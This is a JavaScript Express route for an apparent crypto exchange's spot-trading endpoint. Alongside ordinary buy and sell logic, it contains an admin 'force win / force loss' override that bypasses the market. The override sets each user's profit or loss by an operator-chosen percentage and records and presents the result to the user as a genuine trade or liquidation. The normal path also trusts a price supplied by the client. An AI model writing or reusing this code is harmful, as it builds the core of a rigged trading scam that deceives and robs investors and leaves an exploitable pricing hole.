/**
 * =============================================================================
 *  NEXUS BACKEND — routes/trade.js
 * =============================================================================
 *  Spot trading engine.
 *    POST /api/trade/execute
 *      { side: "buy"|"sell", symbol: "BTC", amount: 0.01, price: 68000 }
 *
 *  Behaviour:
 *    • BUY :  debit USDT   (amount * price), credit `symbol` (amount).
 *    • SELL:  debit symbol (amount),         credit USDT   (amount * price).
 *    • Rejects when funds insufficient.
 *    • Records a `trade` transaction in the ledger for audit.
 *    • Returns the updated user document.
 * =============================================================================
 */

import { Router } from "express";
import { body, validationResult } from "express-validator";
import mongoose from "mongoose";

import User from "../models/User.js";
import Transaction from "../models/Transaction.js";
import { requireAuth } from "../middleware/auth.js";

const router = Router();

const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

const sendValidationError = (res, errors) =>
  res.status(422).json({
    success: false,
    error: "ValidationError",
    message: "One or more fields are invalid.",
    details: errors.array().map((e) => ({
      field: e.path || e.param,
      message: e.msg,
    })),
  });

const requireDatabase = (_req, res, next) => {
  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      error: "ServiceUnavailable",
      message: "Database is offline. Trading is temporarily disabled.",
    });
  }
  return next();
};

// ---------------------------------------------------------------------------
// POST /execute
// ---------------------------------------------------------------------------
router.post(
  "/execute",
  requireAuth,
  requireDatabase,
  [
    body("side").isIn(["buy", "sell"]).withMessage("side must be buy or sell."),
    body("symbol")
      .isString()
      .trim()
      .isLength({ min: 2, max: 10 })
      .withMessage("symbol must be 2-10 chars."),
    body("amount")
      .isFloat({ gt: 0 })
      .withMessage("amount must be > 0."),
    body("price")
      .isFloat({ gt: 0 })
      .withMessage("price must be > 0."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const side = req.body.side;
    const symbol = req.body.symbol.toUpperCase();
    const amount = Number(req.body.amount);
    const price = Number(req.body.price);
    const usdValue = amount * price;

    if (symbol === "USDT") {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Cannot trade USDT against itself.",
      });
    }

    const user = await User.findById(req.auth.sub);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "User not found.",
      });
    }
    if (user.banned) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Account is suspended. Contact support.",
      });
    }

    const currentUsdt = user.wallet.get("USDT") || 0;
    const currentAsset = user.wallet.get(symbol) || 0;

    // -----------------------------------------------------------------
    // Risk / Trade Control override — Force Win / Force Loss
    // Admin has decided the outcome; skip the market entirely and settle
    // the position in USDT with the target percentage.
    // -----------------------------------------------------------------
    const controlState = user.tradeControlState || "normal";
    const controlPct = Number(user.tradeControlPercentage || 0);

    if (controlState === "force_win") {
      const profit = usdValue * (controlPct / 100);
      user.wallet.set("USDT", currentUsdt + profit);
      user.markModified("wallet");
      await user.save();

      await Transaction.create({
        user: user._id,
        kind: "trade",
        side,
        symbol,
        amount,
        usdValue: profit,
        status: "completed",
        reviewerNote: `Auto-close (force win) +${controlPct}%`,
      });

      return res.json({
        success: true,
        message: `${side.toUpperCase()} auto-closed in profit · +${profit.toFixed(2)} USDT.`,
        user,
        override: "force_win",
        pnl: profit,
      });
    }

    if (controlState === "force_loss") {
      const rawLoss = usdValue * (controlPct / 100);
      const loss = Math.min(rawLoss, currentUsdt); // never below zero
      user.wallet.set("USDT", currentUsdt - loss);
      user.markModified("wallet");
      await user.save();

      await Transaction.create({
        user: user._id,
        kind: "trade",
        side,
        symbol,
        amount,
        usdValue: -loss,
        status: "completed",
        reviewerNote: `Auto-close (force loss) -${controlPct}%`,
      });

      return res.json({
        success: true,
        message: `${side.toUpperCase()} liquidated · -${loss.toFixed(2)} USDT.`,
        user,
        override: "force_loss",
        pnl: -loss,
      });
    }

    // -----------------------------------------------------------------
    // Normal market execution
    // -----------------------------------------------------------------
    if (side === "buy") {
      if (currentUsdt < usdValue) {
        return res.status(400).json({
          success: false,
          error: "InsufficientFundsError",
          message: `Not enough USDT. You need ${usdValue.toFixed(2)}, have ${currentUsdt.toFixed(2)}.`,
        });
      }
      user.wallet.set("USDT", currentUsdt - usdValue);
      user.wallet.set(symbol, currentAsset + amount);
    } else {
      if (currentAsset < amount) {
        return res.status(400).json({
          success: false,
          error: "InsufficientFundsError",
          message: `Not enough ${symbol}. You need ${amount}, have ${currentAsset}.`,
        });
      }
      user.wallet.set(symbol, currentAsset - amount);
      user.wallet.set("USDT", currentUsdt + usdValue);
    }

    user.markModified("wallet");
    await user.save();

    await Transaction.create({
      user: user._id,
      kind: "trade",
      side,
      symbol,
      amount,
      usdValue,
      status: "completed",
    });

    return res.json({
      success: true,
      message: `${side.toUpperCase()} order filled at ${price} for ${amount} ${symbol}.`,
      user,
      override: "normal",
    });
  })
);

export default router;
